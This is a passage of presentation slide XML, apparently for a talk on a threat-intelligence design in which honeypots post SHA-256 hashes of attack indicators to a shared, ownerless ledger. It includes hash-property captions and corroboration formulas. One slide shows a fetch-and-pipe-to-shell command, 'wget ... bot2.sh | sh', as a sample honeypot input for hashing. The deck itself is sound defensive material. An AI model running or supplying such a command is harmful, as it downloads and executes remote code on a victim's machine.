              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="sha label 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1444752"/>
            <a:ext cx="914400" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SHA-256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="hash arrow out 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5650992" y="1655064"/>
            <a:ext cx="338328" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="hash output 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1371600"/>
            <a:ext cx="2560320" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="hash output 1 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="1371600"/>
            <a:ext cx="2423160" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6f87e48a9db06a618d25…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="hash input 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2103120"/>
            <a:ext cx="3657600" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="hash input 2 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658368" y="2103120"/>
            <a:ext cx="3520440" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>wget http://198.51.100.7/bot2.sh | sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="hash arrow in 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4279392" y="2386584"/>
            <a:ext cx="338328" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="sha box 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="2176272"/>
            <a:ext cx="914400" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 17391"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="sha label 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="2176272"/>
            <a:ext cx="914400" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SHA-256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="hash arrow out 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5650992" y="2386584"/>
            <a:ext cx="338328" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="hash output 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="2103120"/>
            <a:ext cx="2560320" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="hash output 2 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="2103120"/>
            <a:ext cx="2423160" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>24713c57eecab8f34560…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="hash change caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2743200"/>
            <a:ext cx="8046720" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One extra character gives a completely different fingerprint.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="Same input, same hash icon" descr="Same input, same hash">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3273552"/>
            <a:ext cx="292608" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="property 1 name"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3246120"/>
            <a:ext cx="2011680" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Same input, same hash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="property 1 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3703320"/>
            <a:ext cx="2423160" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Two honeypots that see the same thing produce the same code.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="property rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3154680" y="3246120"/>
            <a:ext cx="9144" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="Tiny change, new hash icon" descr="Tiny change, new hash">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3273552"/>
            <a:ext cx="292608" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="property 2 name"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="3246120"/>
            <a:ext cx="2011680" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tiny change, new hash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="property 2 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3703320"/>
            <a:ext cx="2423160" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Any edit to a record is easy to spot.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="property rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="3246120"/>
            <a:ext cx="9144" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="30" name="Hides the original icon" descr="Hides the original">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="3273552"/>
            <a:ext cx="292608" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="property 3 name"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="3246120"/>
            <a:ext cx="2011680" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hides the original</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="property 3 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="3703320"/>
            <a:ext cx="2423160" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Only hashes go on the ledger, never raw attack data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR DESIGN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hub vs. our hub-less design</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="architecture diagram" descr="Left: three honeypots send raw IOCs to one hub server, a single point of trust and failure. Right: three honeypots anchor tags to a shared ledger with no owner; a fourth node joins later and reads the same history.">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1298448"/>
            <a:ext cx="7315200" cy="2696432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="formula chip 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4114800"/>
            <a:ext cx="2286000" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="formula 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4114800"/>
            <a:ext cx="2286000" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Post  </a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Cambria" pitchFamily="34" charset="0"/>
                <a:ea typeface="Cambria" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Cambria" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>⟨i, H(κ(r))⟩</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="formula chip 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="4114800"/>
            <a:ext cx="3108960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="formula 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="4114800"/>
            <a:ext cx="3108960" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Observers  </a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Cambria" pitchFamily="34" charset="0"/>
                <a:ea typeface="Cambria" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Cambria" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Ω(h) = { i : ⟨i, h⟩ ∈ L }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="formula chip 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4114800"/>
            <a:ext cx="2286000" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="formula 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4114800"/>
            <a:ext cx="2286000" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Corroborated  </a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Cambria" pitchFamily="34" charset="0"/>
                <a:ea typeface="Cambria" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Cambria" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>|Ω(h)| ≥ k</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
